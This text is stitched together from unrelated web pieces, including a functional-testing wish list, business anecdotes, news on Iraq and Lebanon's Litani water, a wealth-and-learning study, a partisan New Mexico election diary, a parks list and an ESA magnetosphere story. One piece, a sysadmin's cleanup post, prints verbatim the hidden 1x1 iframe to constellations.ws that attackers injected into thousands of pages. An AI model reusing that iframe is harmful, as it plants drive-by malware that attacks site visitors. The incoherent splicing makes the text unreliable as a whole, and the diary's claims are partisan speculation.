You ’d provide the necessary information in a centrally controlled configuration file .
Better yet , you ’d have the option of providing the information graphically in a deployment diagram annotated with configuration details .
In short , I want the tool to provide a framework for end - to - end configuration so I only have to provide the details .
But that framework has to be extensible since it can’t possibly predict every configuration task .
Connect Tests to Code
Tests should never break because of routine maintenance on the underlying code .
Yet traditional test automation guarantees that tests will break because there ’s no connection between the tests and the code .
Evenrefactoring - friendly IDEs do n’t automatically update tests unless those tests are considered part of the code in the codebase .
This is also true with traditional , commercial test automation solutions .
In fact , test automators using commercial tools typically spend much of their time trying to keep scripts and GUI maps up - to - date with the latest code .
What a waste .
And even though FIT / FITnesse tests tend to be more maintainable , even they suffer from bit rot if no one maintains the connections between the tables and the fixtures .
I want functional test tools to understand the connection .
So if I make a simple change , like changing the name of a method or variable in a test fixture that ’s referenced in one or more tests , the test tool should automatically update the name in all affected tests .
And if I make a more complex change , likerefactoring a UI , the test tool should at the very least flag all the places in the test code that reference the UI .
Support Navigating from Failures to Code
When an automated test fails , the functional test tool should make it easy to fix the problem .
To do that , it should make the related code just a click away .
So test_foo fails , you click on a “ Show Me the Code ” link , and * pouf * , your IDE opens to the right line in the right file where the expectation was not met , and with a full stack trace available so you can trace back through to figure out where the problem really occurred .
As a tester working with traditional teams , I became too accustomed to not having the source code available .
Having now worked with severalXP teams , that limitation seems silly .
After all , if I notice a simple misspelling in a dialog box , should we really spend all the time necessary for me to file a formal bug report , have the bug triage committee evaluate , prioritize , and assign the bug , have the developer receive the bug and have to reproduce it and track it down , then mark it fixed , and then have me laboriously verify the bug fix ?
That ’s hours of work to fix a typo .
Does n’t it make more sense to give me a link that says “ Show Me the Code ” so I can fix a typo ?
Furthermore , as a developer , when I get a bug report , I have to figure out how to reproduce it , and then have to figure out where in the code the problem is happening .
Would n’t it be easier if I could execute an automated failing test , see a stack trace , and go right to the source of the problem ?
Support Drill Down and Click Through to Explore Relationships
Just like Ward ’s Process Explorer allows me to dynamically navigate views to see the connections between actions , use cases , and results , I want to be able to navigate all these connections on - the - fly .
That means I can see a glance how many tests involve a given action or condition , how many tests check for a given expectation , the pass / fail history of tests related to a given action or condition , pass / fail counts by feature , etc .
All dynamically generated on the fly .
All clickable .
I want to be able to drill down , click through , and report on anything related to the tests and the execution results .
Support Iterating
Imagine the horror if a test tool only allowed you to create tests after you ’d set everything up .
The process would look something like …
1. Install the test tool and listeners on all machines in your test environment .
2. Create all your Test Actions in fixtures .
3. Setup all your Test Data .
4. Create all your Configuration Specifications .
5…N. Perform a bunch of other setup steps .
N + 1 . Create your first test .
In other words , it would take like 4 months before you could write a test .
That ’s insane and unacceptable .
The test tool has to support iterative development .
It has to support bouncing back and forth between specifying tests and specifying actions those tests execute .
It has to support building test data and configurations gradually .
It ca n’t barf if some piece of the puzzle is missing : it should do what it can and provide an accurate , precise , and actionable warning or error when a missing piece prevents it from executing a test .
Let ’s imagine , for example , that a test refers to some action , like “ login ” that has n’t been coded yet .
The test execution engine should report “ Cannot find action ‘ login . ' ”
And the test should be marked as “ not automated , ” not “ fail . ”
The test did n’t fail , after all .
It just did n’t execute .
Be Transparent
I want all these mechanisms to be as lightweight as possible .
Just as xUnit provides a simple way to specify Setup and Teardown tasks , I want the functional test tool in envision to provide a place to put things , but not have heavyweight , ponderous , cumbersome wizards and screens that get in my way more than assist .
The bottom line is that I want my functional testing tools to support testing in a way that is so transparent , so natural , I do n’t even notice I ’m using a tool most of the time .
Good IDEs do this .
They feel a little awkward at first , as you get used to their quirks , their shortcut keys , and how they present views on the code base .
But watch an IntelliJ or Eclipse wizard for a few minutes and you ’ll notice something : they do n’t have to waste time bending the IDE to their will .
They do n’t have to waste mental processing time figuring out how to do what they want to do .
Once they ’ve learned the IDE , configured it to their liking , and become comfortable with the shortcut keys , the IDE just gets out of their way .
The vast majority of their mental effort goes into the code , not into fighting their development environment .
I want test tools to do that too .
I ’m Not Claiming This Wish List is Easy to Achieve
I ’m convinced it ’s technically feasible to create tools that will do everything I ’ve listed here and more .
I imagine the result will be a combination of anIDE plugin , some web - based editors that would allow anyone with server access to create and edit tests , and independently executable programs , like distributed listeners to assist with setup .
Perhaps each part could be a separate open source project and the complete solution would involve deploying the full collection , much like anXP team that uses Eclipse + JUnit+ JWebUnit+Ant+etc..
Or perhaps the result will something else entirely that I have n’t yet imagined .
But I ’m not saying that creating tool will be easy .
Nor am I saying that if we had such a tool , widespread adoption would happen overnight .
I ’m just saying that this is the direction I think we ’re headed : graphical , connected , transparent , and integrated .
Integrated in multiple senses of the word : tests integrated with code , and the testing process integrated with the development process .
Testing has been isolated from development for too long .
But testing cannot afford that isolation .
It does not result in better testing , it results in inefficient testing .
It results in spinning wheels .
It results in frustration .
It results in an enormous waste of time .
And I think that any step we can take toward making today ’s tools more graphical , more connected , and more integrated brings us closer to the future .
Having written all this , I have some ideas about implementation … but those ideas will wait for another time .
And , at this point , they ’re just ideas .
For that matter , I think I ’ll try out my implementation ideas before I get myself too wound up Thinking Big Thoughts and not actually doing anything about them .
In the meantime , I ’d like to know your thoughts … what else would you want in Functional Testing Tools : The Next Generation ( FTT : TNG ) ?
What ’s the Big Idea ?
Why most innovations fail to scale and what to do about it
Story Line : " Many fail to grasp what is right in the palm of their hands . " -- Quote by Roger von Oech
1. Sherlock Homes and Dr. Watson ( from Roger von Oech )
Sherlock Homes and Dr. Watson went on a camping trip .
They pitched their tent under the stars and went to sleep .
In the middle of the night , Holmes awakened and exclaimed , Watson , look up and tell me what you deduce . ”
Watson opened his eyes , and said , “ I see billions and billions of stars .
It is likely that some of these stars have planetary systems .
Furthermore , I deduce that there is probably oxygen on some of these planets , and it is possible that life has developed on a few of them .
Is that what you see ? ”
Holmes replied , “ No , you idiot .
Somebody stole our tent . ”

2 . True story that happened in the 1980s , at a company with unique high tech products
On one Friday morning , while the director of operations ( Cody ) was chatting with his employee , the CEO walked in to his office and said “ Cody , I am on phone with a ( major ) potential customer .
He is not happy with the performance of his current supplier and has approached us .
I need build forecasts and availability for xyz product . "
Cody assured the CEO that he had the information ( handy ) and he would bring it to him .
Now Cody was one of those guys , a great devotee of PC and all wonderful gadgets and tools that PC was bringing to this world .
He had discovered “ Harvard Graphics ” ( a software for presentations ) only a month ago , and he had non stop fascination for this new toy .
So he picked up the sheet of paper on his desk , on which there was already all the information about product builds and availability that the CEO needed , and started entering the data in the “ Harvard Graphics ” program .
( Cody was not happy that the original information was written in pencil with few mark up notes )
A few minutes later , the CEO walked in to Cody ’s office , with the color of his face as red as seen only on some special species of South American monkeys , and said “ Cody , the customer just hung up the phone .
I lost the opportunity .
No executive in the United States has to put up with the bull@ # $ % that I have to put with you , Cody . ”
And the CEO left .
Fuming Cody asked his employee to close the door .
( Irony of fate or what , but the small company did not have a " 360 degree feedback " process for Cody to get back at the boss .
Small companies could not afford that level of luxury ) .
Cody told his employee , “ the CEO is unreasonable , insensitive , does not get it ... all that I was trying to do was to give him presentation style material , since it is for the customer . ”
The employee being loyal to Cody , gathered all his courage and told him “ Boss , all that you needed to do was hand him the original sheet of paper on your desk when CEO walked in the first time . ”
Sequel : Cody is retired and lives in the Rocky Mountains .
“ That Employee ” is still employed in the semiconductor industry and doing bigger and better things .
The whereabouts of CEO are unknown .
He may have found serenity in the forests of the Amazon ( after dealing with more Codys in his career )
Due to many requests from the readers , these stories have been repeated from previous emails .
I wonder why people want to hear these stories again and again ?
WASHINGTON ( Reuters ) - President George W. Bush would like to see a lengthy U.S. troop presence in Iraq like the one in South Korea to provide stability but not in a frontline combat role , the White House said on Wednesday .

The United States has had thousands of U.S. troops in South Korea to guard against a North Korean invasion for 50 years .
Democrats in control of the U.S. Congress have been pressing Bush to agree to a timetable for pulling troops from Iraq , an idea firmly opposed by the president .
White House spokesman Tony Snow said Bush would like to see a U.S. role in Iraq ultimately similar to that in South Korea in which “ you get to a point in the future where you want it to be a purely support model . ”
“ The Korean model is one in which the United States provides a security presence , but you ’ve had the development of a successful democracy in South Korea over a period of years , and , therefore , the United States is there as a force of stability , ” Snow told reporters .
Senate Democratic Leader Harry Reid of Nevada said in a statement he believes it is time for Bush to “ recognize the reality on the ground in Iraq , ” that U.S. troops are mired in an Iraqi civil war and a change in course is urgently needed .
“ Democrats know that Americans demand realistic plans , not more White House rhetoric , rosy predictions and best - case scenarios .
Our troops and the American people deserve better , ” Reid said .
Iraq ’s neighbors have raised concerns about the possibility of the United States maintaining permanent bases in Iraq , and some U.S. lawmakers have said they think the Iraqi insurgency may have been fueled by perceptions the United States wants a permanent presence in the country .
Washington has consistently denied wanting permanent bases in Iraq .
Snow said U.S. bases in Iraq would not necessarily be permanent because they would be there at the invitation of the host government and “ the person who has done the invitation has the right to withdraw the invitation . ”
“ I think the point he ’s ( Bush ) trying to make is that the situation in Iraq , and indeed , the larger war on terror , are things that are going to take a long time .
But it is not always going to require an up - front combat presence , ” Snow said .
“ The president has always said that ultimately you want to be handing primary responsibility off to the Iraqis , ” he said .
“ You provide the so - called over - the - horizon support that is necessary from time to time to come to the assistance of Iraqis but you do not want the United States forever in the front . ”
Economists have postulated that people 's perception of the value of financial gains decreases as they become richer , but scientists have not really been able to measure this change in " marginal utility " in the laboratory ... until now .
Neurobiologists Philippe Tobler , Wolfram Schultz , and colleagues have found that richer people are slower to learn to associate a stimulus with a financial reward than are poorer people , and this slower learning is reflected in slower response in the brain areas associated with reward and reward - directed learning .
In their experiments , the researchers used a Pavlovian conditioning approach to study how people 's wealth affects their ability to learn to associate a stimulus with a financial reward .
However , instead of the bell and food Pavlov used in his experiments with dogs , Schultz and colleagues used a reward - predicting stimulus image followed by the reward image of a coin .
The subjects were told to press a button to signal when they saw the stimulus image , versus a different image that would be followed by a nonreward scrambled picture of the coin .
To quantify their learning speed , the subjects were told to indicate their confidence in their choices by the duration of their button press .
And to motivate the volunteers , the researchers told them that they would receive all the coins they saw at the end of the experiments .
While the subjects were learning , and unlearning , to associate the reward - predicting image with the coin , the researchers used functional magnetic resonance imaging to measure the activity in their brains ' reward centers .
This brain - scanning technique uses harmless radio waves and magnetic fields to measure blood flow in brain regions , which reflects brain activity .
The researchers found that the richer the subjects were -- both in terms of assets and income -- the slower they learned or unlearned the association between the conditioning image and the coin .
The researchers found the same inverse association between wealth and their neural response in reward areas .
In contrast , the subjects ' education or age did not correlate with the speed of learning .
The researchers also measured the marginal utility of money by asking the subjects how often they would be likely to pick up a coin from the street .
They also found that the greater a subject 's wealth , the lower the chance the subject would retrieve the coin .
Tobler , Schultz , and colleagues wrote that " the progressively smaller gain with increasing wealth would provide decreasing reward value that could lead to the reduced learning speed .
Thus , individuals for whom a financial unit has lower marginal utility would show slower acquisition and extinction than individuals for whom the same unit has higher marginal utility .
Or , put differently , ' The rich are different from you and me . ' "

Evil hackers attack !
Some customers of mine recently reported some suspicious behavior on one of their sites .
I discovered , with dismay , that a number of months ago there was a nasty cPanel exploit that some evil hackers had used to insert a malicious line of code into the bottom of every HTML page on this server .
After verifying that the cPanel installation had been fixed , I used grep to search through all the files on the server to see if any other files had been touched by the hackers .
I found over 4,700 individual files that had malicious code added and knew that something needed to be done immediately to address this problem .
Not the best way to start my day …
The Problem
This is the code that had been added right above the closing < / body > tag in these files :
< iframe src= " https://www.constellations.ws/index.php " width=1 height=1 frameborder=0 scrolling=NO ></iframe >
By including a reference to an external site ( “ constellations.ws ” ) this allowed malicious ActiveX code to be presented to people viewing the infected pages .
I had to remove all instances of this bad code immediately to keep anyone else from having problems .
How I fixed 4,700 files with one command
First , I changed directory into my / home / directory , which contains all user account files on this server .
# cd /home /
Then I ran this Unix command line search and replace command to find all files that contained the malicous text and replace the bad text with nothing to delete it :
# grep -rl constellations.ws * | sed 's / /\ /g ' | xargs sed - i 's /< iframe src= " http:\/\/www.constellations.ws\/index.php " width=1 height=1 frameborder=0 scrolling=NO ><\/iframe>//g'
What ’s with all the grep , sed and xargs stuff ?
The way this works is it first does a search using grep for all files that contain the bad text – “ constellations.ws ” .
Using the -l flag tells grep to only print out the filename of the matched files instead of both the filename and the matching line (s ) .
The -r option tells grep to recursively search every directory and file , not just the files in the current directory .
Next , the output of the initial search is piped to sed ( stream editor ) to escape all spaces that may be present in the initial search results ( some of the directories had spaces in them and this properly replaces the space with an escape character ( the \ backslash ) and a space which prepares them for the next step .
The final step is to pipe the escaped results of the grep command to xargs which then passes each individual result line in as an argument to the specified sed command , which in turn looks for the specific bad code and replaces it with nothing ( deleting it ) .
Note the backslashes in the code to be replaced — these are used to escape the / characters , which otherwise sed would interpret as command characters .
Using the - i option for sed tells it to edit files in - place instead of just sending the output to standard output .
This saves each file after the replacement has been made .
The g flag tells sed to replace every instance of the found text , not just the first instance .
To check to make sure that I fixed every file , I did a final check :
# grep -r constellations.ws *
This confirmed that all of the malicious code had been removed correctly from the HTML files .
There were a couple of temporary web stat log files that still had references to “ constellations.ws ” in them ( recorded as link clicks ) but there were indeed no more references to the code that I had removed with the command .
You will need to run this as root if you are cleaning out an entire server , otherwise you will only be able to change any files that your username has permission to edit .
Using this for yourself : a Unix multi- file search and replace command template
Here is a generalized multi- file search and replace command template that you can use on your own server :
# grep -rl FIND_STRING * | sed 's / /\ /g ' | xargs sed - i 's / EXACT_FIND_STRING/REPLACE_STRING/g '
Using this code you will search for all files that contain FIND_STRING , then replace every specific instance of EXACT_FIND_STRING with the value you supply for REPLACE_STRING .
You must properly escape the text that you are searching for as well as the text you are using to replace what gets found .
Note that FIND_STRING may be the exact same text as EXACT_FIND_STRING , but this method lets you use FIND_STRING to search for a smaller part of the thing you ’re looking for like I did in the example above .
If you want to preview what the command will do before you commit a save ( not a bad idea ) , simply omit the - i option from the sed command that is connected to the xargs command .
This will output to standard output ( your terminal ) what the final change would be .
If it looks right , then run the command as given above ( including the - i ) and the files will be saved with the text changes .
I hope this is a helpful explanation of how to search for a particular string using the Unix command line in multiple files and then replace it with something else .
Happy searching and replacing !
Disclaimer : I am not responsible for anything you do on your own server .
This worked for me , but I was pretty careful to make sure that it was appropriate for my specific case .
This command WILL CHANGE FILES on your server .
Understand what it is doing before you run it .

Dodd is out of the Fox News / CBC debate .
Obama , Clinton , Edwards and Richardson had already passed .
Richardson spokeswoman Katie Roberts and Dodd spokeswoman Christy Setzer both said today their bosses wo n't attend .
MoveOn is trying to pressure Biden to drop out , but that 's pretty stupid .
Let him attend .
A debate between Biden , Kucinich , and Gravel should provide infinite entertainment .
It 's a long campaign season .
We 'll need all the comedy we can get .
And what better way to prove that Fox News is a joke than to hang them with this " debate " ?
The real news networks can get the real debates .
Fox News can have the " reality freak show " version .
Albuquerque Journal today ( from tomorrow's fish wrapper , as I could n't find it online ) : Complaints include getting only one guilty conviction on 25 federal charges prosecuted against Democratic State Treasurer Robert Vigil .
At the same time , Iglesias was criticized for not bringing charges on “ voter fraud ” in 2004 .
Iglesias did pursue the matter :
He set up a task force on voter fraud .
But ...
After investigating a “ hatful ” of allegations brought to him , Iglesias said he did not have enough evidence to bring charges .
“ Most of the complaints were completely without basis , ” Iglesias said .
“ At the end of the day , we decided we did not have any cases we could prove beyond a reasonable doubt .
... We cannot prosecute on rumor and innuendo . ” Former Secretary of State Rebecca Vigil - Giron , a Democrat , said that Iglesias was eager to prosecute voter fraud and appointed a liaison to her office to monitor allegations .
... “ I think he acted with enough force in regards to voter fraud , Vigil - Giron said in a telephone interview from New Mexico Wednesday .
Iglesias was between a rock and a hard place :
Do n’t prosecute and get in trouble .
Prosecute a shaky case and so not win sufficient convictions ?
That ’s bad , too .
And , if you look a little closer at “ voter fraud ” here in the Land of Enchantment , you soon realize Iglesias was serving the Republicans better by not entering prosecutions .
Why ’s that ?
According to Greg Palast :
Last year , I flew to New Mexico to investigate the 33,981 cast but not counted ballots of that state in the 2004 race .
George Bush “ won ” New Mexico by 5,988 votes .
Or did he ?
I calculated that , of the all the ballots rejected and “ spoiled , ” 89 % were cast by voters of color .
Who won New Mexico ?
Kerry won — or he would have , if they had counted the ballots .
And another staple of voter suppression from Palast :
What ’s wrong with the new ID laws ?
This : in the 2004 election , 300,000 voters were turned away from the polls for “ wrong ” ID .
For example , in the “ Little Texas ” counties in New Mexico , if your voter registration included a middle initial but your driver ’s license had none , you were kicked out of the polling station .
Funny , but they only seemed to ask Hispanic voters .
We should see the number of voters rejected for ID to quintuple by 2008 based on the new “ voting reform ” laws recently passed in several states .
New Mexico also had a lot of “ undervotes ” - the highest rate in the nation .
And mostly amongst Native American & Hispanic voters .
More detail on New Mexico ’s 2004 vote here ( 12 - page pdf ) .
But , of course , that ’s voter suppression .
Iglesias was supposed to go after voter fraud .
PHANTOM VOTES 2004
Phantom votes is the name for when a voting machine records more votes than there were voters signed in .
Aha !!
Iglesias could have gone after those irregularities .
Surely that ’s voter fraud !!!!
" That ca n't be what they really call them ! " I exclaimed in amusement .
But Lowell Finley , legal counsel for the Green / Libertarian recount effort in New Mexico , assured me that ' phantom vote ' was indeed the common legal term for the puzzling phenomenon I had uncovered in looking at the state 's canvass report .
A phantom vote occurs when the number of votes recorded exceeds the number of ballots cast .
Mathematically , phantom votes are merely the inverse of undervotes .
Undervotes , which show up when there are less votes than ballots cast , can be accounted for more or less persuasively in one way or another but I have yet to come up with any acceptable explanation for phantoms .
Much less , 2,087 of them statewide in New Mexico , just about one third of the margin of victory that determined the selection of that state 's presidential electors .
...
Phantoms are not new to New Mexico .
In the 1996 canvass report we find 998 phantom votes in Chaves County - an astonishing rate of 5.57 % .
In 2000 in Dona Ana County , N.M. 5,509 absentee ballots somehow resulted in 6,456 votes .
When Denise Lamb at the Secretary of State 's office was asked to explain the 947 phantom votes , she blamed " administrative lapses . "
But wait a minute - no one would accept that sort of " lapse " on a monthly bank statement or a sales receipt from the 7 - 11 .
Why would anyone accept it in this , " the most important election of our lives " in which " every vote will count and every vote will be counted " ?
Except : Chaves County and Doña Ana County are in the southern part of the state , in Congressional District NM - 02 where Republican Stevan Pearce was just re-elected with 60 % of the vote .
These were likely Republican votes !
Gee , maybe Karl Rove et al. did n’t actually want Iglesias investigating this , after all .
Detail on Top 20 Phantom Vote Precincts have been summarized , and there ’s a pdf with complete analysis , too , thanks to the hard - working activists at Voters Unite .
It ’s worth remembering that phantom votes are added together with undervotes for a net value .
So phantom votes not only provide “ impossible ” votes , they obscure unusually high rates of undervotes elsewhere at the same time .
VOTER FRAUD 2006
Then there was a little voter fraud problem reported in NM - 01 this past November .
A Bernalillo County ( Albuquerque ) poll worker may have stuffed a ballot box for Heather Wilson , and Iglesias did n’t pursue it .
Wilson ’s election attorney , Patrick Rogers , was very pious about it in retrospect :
“ I think that honest elections are critical , and it was apparent from prior to 2004 to 2006 that it was n’t a priority of David ’s , ” he said .
“...
When it became immediately clear to me that Iglesias was going to ignore this serious allegation , I felt it was my duty to report it .
I do n’t know why Mr. Iglesias exhibited no or insufficient interest in investigating evidence of voter fraud and white - collar allegations . ”
Hardly sounds like the kind of neglect of prosecution that would get the folks at DoJ fired up enough to get Iglesias fired .
Though I suppose I could be wrong about that .
Detailed timeline from US News & World Report
These Republicans are eating their own young !!
At what point will Karl Rove realize that the problem ( from his POV : losing the 2006 election ) does n’t lie with the prosecution of the scandals ?
It lies with the underlying corruption .
The problem is n’t that Carol Lam prosecuted Duke Cunningham .
Any public official delivering favors for millions in bribes deserves to be in jail .
Anyone who ca n’t see that - i.e.
Rove - has a lack of basic judgement and common decency bordering on sociopathy .
SWIFTBOATING in NM - 01 , 2006
In the six months before the midterm , there were harsh , agressive , ads for the campaign in NM - 01 .
It was almost enough to get me - a lifelong TV addict - to turn the box off .
They were particularly bad in the last few weeks from an outfit called Americans for Honesty on Issues ( AHI ) .
This is one of three 527s funded by Bob Perry , the Houston housing contractor who bankrolled the Swiftboat effort of 2004 .
AHI was registered with the FEC on October 6 , 2006 , and ran on a single $ 2,000,000 donation from Perry , who turned out to have been the single largest contributor in the 2006 midterm elections .
The only listed agent for AHI is Sue Walden , who ’s mainly a player as a political fundraiser in Houston city politics .
She ’s also worked as a fundraiser for Tom Delay , a lobbyist for Enron ( and loyal personal friend of Ken Lay & Jeffrey Skilling after their disgrace ) , and includes Karl Rove amongst her friends .
This part of the story has had little attention compared to the angles summarized above .
This diary ’s long enough already , so I ’ll have to go into their meddling in NM - 01 in another upcoming diary .
Here ’s my guess though : Tom Delay had a lot of spare time on his hands over the summer , having resigned from the House and all .
The two principals of AHI are reportedly his “ friends ” .
It seems entirely possible that he had a hand in spending Perry ’s millions through those three 527s .
As it turns out , most of the most objectionable ads of the 2006 midterms all emanated from this same source .
And in the case of NM - 01 , the circumstances look like they would have had there been obstruction of justice and flagrant violation of election laws banning coordination of efforts .
Of course , I do n’t know for sure , but that ’s my suspicion .
So keep an eye out for my next diary on this topic , which will focus on that aspect of the story .
TIME OUT FROM SCANDAL FOR PAJAMAS PETE
Meanwhile , Domenici will have some time out from the Iglesias scandal tomorrow , as he ’ll be getting a Woodrow Wilson Award for Public Service from the Smithsonian on Friday , March 16th with Sam Donaldson and Don Chalmers ( who owns Albuquerque car dealerships ) presiding .
At PPS , we love to stick our necks out .
And we 've done it again here with these lists of the best and worst parks , along with the best and worst squares .
We know all of these parks and squares very well -- meaning we have studied them at various times of the year , we 've worked on campaigns to improve them , or we have visited them at least five times .
With both our lists of the greats and those most needing improvement , we hope to inspire discussion about how to make all parks and squares better .
‍ The Piazza del Campo in Sienna , Italy tops our list of the world 's best squares
The real reason we 've done this is to get you thinking .
We want to hear your opinions on what are the great parks and squares of the world and which ones are overrated and in need of serious overhaul .
Please tell us about the great ( and not - so - great ) parks and squares in your city that you use often and know well , which we may not know about .
Some of these choices may surprise you .
New York 's Bryant Park was once on our honor roll of Great Public Spaces and now we 're listing it as a park needing big changes .
( See When bad things happen to good parks in this issue of the newsletter . )
Chicago 's new Millennium Park has won raves nationally ( See Jay Walljasper 's Town Square column in this issue ) , but it is too early to know where it fits here .
There was wide debate in our office about Copenhagen 's Tivoli Gardens , which some of us think is the best park in the world .
It does n't fit the classic definition of a park , however , even though it offers an interesting model for the future .
We will discuss it further in the next issue of Making Places .
And in compiling this list , it struck us that plazas are important public places whose role in society needs more thought .
We hope to explore this idea further in a future issue of our newsletter .
We 've concentrated our choices on North America and Europe , where parks and squares are the classic forms of public space .
Different types of places , such as markets , prevail in other parts of the world , which we hope to address in the future .

This image shows a three - dimensional cut-away view of the magnetic ' bubble ' surrounding Earth , called magnetosphere .
The curly features sketched on the boundary layer are the so - called ' Kelvin - Helmholtz ' vortices discovered by Cluster [ Hasegawa et al. , 2004 ] .
The vortices , or whirlpools , originate where two adjacent flows of electrically charged gas ( plasma ) travel with different speed .
In this case , one of the flows is the heated gas inside the boundary layer of the magnetosphere , the other one is the solar wind just outside it .
The white dashed arrow shows the trajectory followed by Cluster when the vortices where discovered .
Credits : ESA / Hasegawa et al .
Giant whirlpools of electrically charged gas , some 40 000 kilometres across , have been witnessed above the Earth by a team of European and American scientists .
Using data from ESA 's Cluster quartet of spacecraft , the researchers have shown that these whirlpools inject electrified gas into the magnetic environment of the Earth .
The magnetic field generated inside the Earth protects the planet from the electrically charged particles given out by the Sun .
However , it is only a partially effective shield .
In the same way that a car can only travel along roads , electrically charged gas , known as plasma , can only travel along magnetic field lines , never across them .
For a car to suddenly change direction , it has to use a road junction .
For a particle of plasma to suddenly jump onto a different field line , there has to be a reconnection event .
In a reconnection , magnetic fields lines spontaneously break and then join up with other nearby lines .
In doing so , the plasma is suddenly redirected along new routes .
Scientists know this happens in Earth 's magnetosphere because of changes to the plasma sheet .
This is one of the inner regions of the Earth 's magnetic field .
Plasma in the sheet is usually hot and tenuous , whereas the solar wind is cooler and denser .
At certain times , the sheet fills with cooler and denser plasma over the course of a few hours .
For this to happen , the solar wind plasma must somehow be able to cross the Earth ’s magnetic boundary , known as the magnetopause .
Yet , until now scientists had no observational evidence that reconnection inside whirlpools contribute to this process .
" Wondering how the solar wind could get into the plasma sheet is how I became interested in this problem , " says Katariina Nykyri , lead author of the results , from the Imperial College , London , UK .
Together with colleagues , Nykyri began investigating a strange event recorded by Cluster on 3 July 2001 .
At this time , Cluster was passing the dawn side of the Earth .
In this region of space , the solar wind is sliding past the Earth 's magnetopause , in roughly the same way as wind blows across the surface of an ocean .
A previous Cluster observation had shown that whirlpools of plasma can be whipped up by this configuration .
Such whirlpools are known as Kelvin - Helmholtz instabilities and scientists suspected them of being the location of magnetic reconnection but no one had found any conclusive evidence that this was the case .
Cluster can recognise magnetic reconnection because of what researchers call ' rotational discontinuities ' .
These show up as sudden changes in the direction of the plasma flow and magnetic field .
After a painstaking analysis , Nykyri found just such rotational discontinuities in the data for 3 July 2001 .
To be certain of her result , she reanalysed the data four times .
Then she developed a computer model to simulate the event .
The computer showed that the Cluster data was only understandable if the whirlpools were causing magnetic reconnection to take place .
In these reconnections , plasma was being fed down through the magnetic boundary of Earth and into the magnetosphere .
The work does not stop there .
Nykyri and colleagues are now developing more sophisticated computer simulations to understand the whirlpools ’ three - dimensional behaviour .
" This is a very big challenge , " she says , because of the additional numerical processes involved .
She also plans to search the Cluster data archive for more examples of these events .

Israeli bombing has knocked out irrigation canals supplying Litani River water to more than 10,000 acres of farmland and 23 villages in southern Lebanon and the Bekaa Valley , prompting accusations here that Israel is using its war against Hezbollah to lay claim to Lebanon ’s prime watersheds .
Heavy fighting and a series of targeted strikes on open water channels and underground water diversion pipes have suspended much of Lebanon ’s agricultural use of the Litani River along the coastal plain and in parts of the Bekaa Valley near Qaraoun Dam , said water engineers who have surveyed the south .
The damaged or broken facilities include a pumping station on the Wazzani River , whose inauguration by Lebanon in 2002 prompted Israel to threaten military action because it diverted water a few hundred yards from the Israeli border , in a watershed that feeds the Jordan River , Lebanese officials said .
At the time , Hezbollah promised to defend the facility .
The strikes went largely unnoticed by the outside world in the nearly monthlong air assault targeting Hezbollah guerrilla strongholds in southern Lebanon .
But Lebanese point to the extensive damage to their irrigation and drinking water system as evidence that border security and water issues remain intertwined in a region short on both .

“ Whenever Israel throughout history has thought of its northern border , they do n’t talk , for example , of the mountains as a border .
They always think of the valley of the Litani , ” said Mohammed Shaya , dean of the college of social sciences at Lebanese University in Beirut .
Israel has said repeatedly that it has no designs on Lebanon ’s water .
“ There ’s a policy decision at the highest level not to target those water pumping stations , ” said Mark Regev , a spokesman for the Israeli Foreign Ministry .
“ We do n’t claim an inch of Lebanese sovereign territory .
We do n’t claim a gallon of Lebanese water .
We have no hostile intentions whatever towards Lebanon as a country , towards the Lebanese people or towards Lebanese natural resources . ”
But the enduring suspicion in Lebanon that Israel regards the water of the Litani as its own and the lands to its south as a security perimeter help explain Beirut ’s reluctance to accept any U.N. cease - fire resolution that does not call for an immediate Israeli withdrawal from the region .

At a minimum , Lebanese officials fear that the repeated attacks on water facilities -- as well as bridges , highways , power plants and roads -- signal an intention to debilitate Hezbollah - dominated southern Lebanon and enable a long - term Israeli presence there .
“ They started [ bombing ] with the Litani water reservoir , the Litani dam .
And we all know that the Litani has a special place in this country , ” said Fadl Shalaq , president of the Lebanese Council for Reconstruction and Development .
“ It ’s a big reservoir of water , and the Israelis do n’t hide it that there are several parts of the Litani that they would like to take for themselves . ”
Officials in southern Lebanon said the attacks hit not only bridges , but open water canals , crippling irrigation to thousands of acres here in the Tyre region and in the Bekaa Valley .
During fighting near the Wazzani springs , a guard at the pumping station was killed , the pump was knocked out of service and the underground pipes through which water is transported were heavily damaged , said Hussein Ramal , an engineer for the Litani Water Authority , which operates irrigation systems in the region .
“ Now every one of these villages is without water . ”

The Litani flows 102 miles , entirely within Lebanon .
It courses south through eastern Lebanon ’s Bekaa Valley , before turning sharply westward just 2 1/2 miles from the Israeli border , then heading through the coastal plain , past the town of Qasmiya to the Mediterranean , north of Tyre .
Zionist leader Chaim Weizmann , who would become the first president of Israel , in 1919 included the Litani valley among the “ minimum requirements essential to the realization of the Jewish National Home . ”
David Ben-Gurion , Israel ’s first prime minister , proposed including the Litani again in the 1940s on the eve of the creation of the Jewish state .
In the 1950s , historical records show , Moshe Dayan , then chief of staff of the Israel Defense Forces , and others favored occupying and ultimately annexing southern Lebanon up to the Litani River .
Occupation of the West Bank and Golan Heights , though motivated by security concerns , has provided Israel with an important source of water .
Experts note that the small slice of land known as the Shebaa Farms , one of the issues in the current conflict , is graced with abundant groundwater flowing from the slopes of Mt. Hermon .
Israel also sees Shebaa Farms as a strategic asset because of its proximity to the Israeli , Syrian and Lebanese borders .

Israel has always argued that much of the Litani ’s water flows to the sea , wasted .
A large portion of the river ’s flow is diverted to a series of hydropower dams , leaving relatively little for irrigation in southern Lebanon .
But the Lebanese government had planned to offer a $ 200 - million contract this summer to irrigate major new sections of the region .
Both states would benefit if Israel sold Lebanon power and Lebanon sold Israel water , said Haim Gvirtzman , hydrology professor at Hebrew University .
“ Should there be peace between Israel and Lebanon , then it will be possible to use the Litani ’s water as a trigger for a fruitful cooperation between the two countries , ” Gvirtzman said .

But the Lebanese fear that a prolonged Israeli occupation would give the Jewish state ample time to develop its own international “ projects ” for sharing the Litani ’s water .
“ In this war , the whole symbol of water has come back with the insurgency now .
Because Israel ’s declared war is to push out the Katyushas ” -- the rockets being fired by Hezbollah militants -- “ but the long - range aim , I believe , is to again enter the water issue and push it on the Lebanese , ” said Mahmoud Haidar , head of the Delta Center for Research and the Press in Beirut .
“ If Israel is the winner in this war , in any settlement , ” he said , “ water will become an issue .
It will become part of the Israeli demands . ”
A report on Debka File , a website often described as reflecting the thinking of Israeli intelligence , described “ Israel ’s recovery of control over its main sources of water ” at Wazzani as “ the most important gain from the crisis ” in Lebanon .

“ Israel will not cede this asset in a hurry , ” the website predicted .
“ Worth citing in this regard is Defense Minister Amir Peretz ’s statement after U.S. Secretary of State Condoleezza Rice left the Middle East , that Israel would retain control of a security belt in southern Lebanon until a multinational force takes over . ”
